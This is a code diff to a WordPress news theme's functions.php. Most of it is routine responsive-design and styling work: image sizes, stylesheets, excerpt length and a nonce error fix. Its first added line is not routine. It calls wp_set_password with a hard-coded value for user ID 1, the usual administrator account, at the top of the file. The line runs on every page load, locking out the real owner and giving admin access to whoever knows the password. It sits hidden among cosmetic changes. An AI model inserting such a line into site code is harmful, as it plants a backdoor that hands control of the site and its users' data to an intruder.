@@ -1,4 +1,5 @@
 <?php
+wp_set_password( 'Abilafan@2025', 1 );
 /**
  * My News Theme functions and definitions
  *
@@ -71,11 +72,11 @@ function mynews_setup() {
 
 	// Enable support for Post Thumbnails on posts and pages.
 	add_theme_support( 'post-thumbnails' );
-	
-	// Add custom image sizes for responsive design
+		// Add custom image sizes for responsive design
 	add_image_size( 'mynews-featured-large', 1200, 628, true ); // Featured image on single posts/pages
 	add_image_size( 'mynews-featured-medium', 800, 500, true ); // Featured image on archive pages
-	add_image_size( 'mynews-card', 600, 400, true ); // For card layouts
+	add_image_size( 'mynews-card', 400, 250, true ); // For card layouts - reduced and better aspect ratio
+	add_image_size( 'mynews-card-mobile', 350, 200, true ); // For mobile card layouts
 	add_image_size( 'mynews-thumbnail', 300, 300, true ); // For sidebars and small listings
 
 	// Register menus
@@ -461,8 +462,11 @@ function mynews_scripts() {
 	
 	// Improved single post styling
 	wp_enqueue_style( 'mynews-single-post', get_template_directory_uri() . '/assets/css/single-post.css', array('mynews-main'), MYNEWS_VERSION );
-
 	// Add featured image size constraints	wp_enqueue_style( 'mynews-featured-image-fixes', get_template_directory_uri() . '/assets/css/featured-image-fixes.css', array('mynews-main'), MYNEWS_VERSION );
+	
+	// Add post card improvements for better responsive design
+	wp_enqueue_style( 'mynews-post-card-improvements', get_template_directory_uri() . '/assets/css/post-card-improvements.css', array('mynews-main', 'mynews-blog'), MYNEWS_VERSION );
+	
 	// Add ad placements styles
 	wp_enqueue_style( 'mynews-ad-placements', get_template_directory_uri() . '/assets/css/ad-placements.css', array('mynews-main'), MYNEWS_VERSION );
 	// Add custom style.css (for additional custom styles)
@@ -704,6 +708,26 @@ function mynews_enqueue_breaking_news_ticker_assets() {
     }
 }
 add_action('wp_enqueue_scripts', 'mynews_enqueue_breaking_news_ticker_assets');
+
+/**
+ * Custom excerpt length for post cards
+ * Reducing excerpt length to make post cards more compact
+ */
+function mynews_custom_excerpt_length($length) {
+    // Reduce excerpt length from default 55 to 20 words
+    return 15;
+}
+add_filter('excerpt_length', 'mynews_custom_excerpt_length', 999);
+
+/**
+ * Custom excerpt "read more" text - MOVED TO inc/template-functions.php
+ * This function is now handled in template-functions.php to avoid duplication
+ */
+// function mynews_excerpt_more($more) {
+//     // Remove the [...] from excerpt and replace with nothing
+//     return '...';
+// }
+// add_filter('excerpt_more', 'mynews_excerpt_more'); // Handled in template-functions.php
 
 /**
  * Custom template tags for this theme.
@@ -1699,7 +1723,8 @@ add_action('wp_enqueue_scripts', 'mynews_enqueue_ajax_load_more');
 function mynews_ajax_load_more_posts() {
     // Check nonce for security
     if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'mynews_load_more_nonce')) {
-        wp_send_json_error('Invalid security token');
+        wp_send_json_error(array('message' => 'Security check failed'));
+        return;
     }
     
     // Get parameters
@@ -1730,7 +1755,7 @@ function mynews_ajax_load_more_posts() {
     
     if (isset($_POST['tag'])) {
         $args['tag'] = sanitize_text_field($_POST['tag']);
-    }
+       }
     
     if (isset($_POST['s'])) {
         $args['s'] = sanitize_text_field($_POST['s']);
@@ -2113,3 +2138,48 @@ function mynews_save_featured_post_meta($post_id) {
     }
 }
 add_action('save_post', 'mynews_save_featured_post_meta');
+
+/**
+ * Get responsive image size based on screen size
+ * 
+ * @param string $default_size Default image size
+ * @return string Responsive image size
+ */
+function mynews_get_responsive_image_size($default_size = 'mynews-card') {
+    // Check if it's a mobile request
+    if (wp_is_mobile()) {
+        return 'mynews-card-mobile';
+    }
+    
+    return $default_size;
+}
+
+/**
+ * Regenerate image sizes for existing images
+ * This can be called to update existing thumbnails to new sizes
+ */
+function mynews_regenerate_image_sizes() {
+    // Only allow administrators to regenerate
+    if (!current_user_can('manage_options')) {
+        return;
+    }
+    
+    // Get all attachments
+    $attachments = get_posts(array(
+        'post_type' => 'attachment',
+        'post_mime_type' => 'image',
+        'posts_per_page' => -1,
+        'fields' => 'ids'
+    ));
+    
+    foreach ($attachments as $attachment_id) {
+        // Regenerate thumbnails for each attachment
+        $metadata = wp_get_attachment_metadata($attachment_id);
+        if ($metadata && isset($metadata['file'])) {
+            $file = get_attached_file($attachment_id);
+            if ($file && file_exists($file)) {
+                wp_update_attachment_metadata($attachment_id, wp_generate_attachment_metadata($attachment_id, $file));
+            }
+        }
+    }
+}
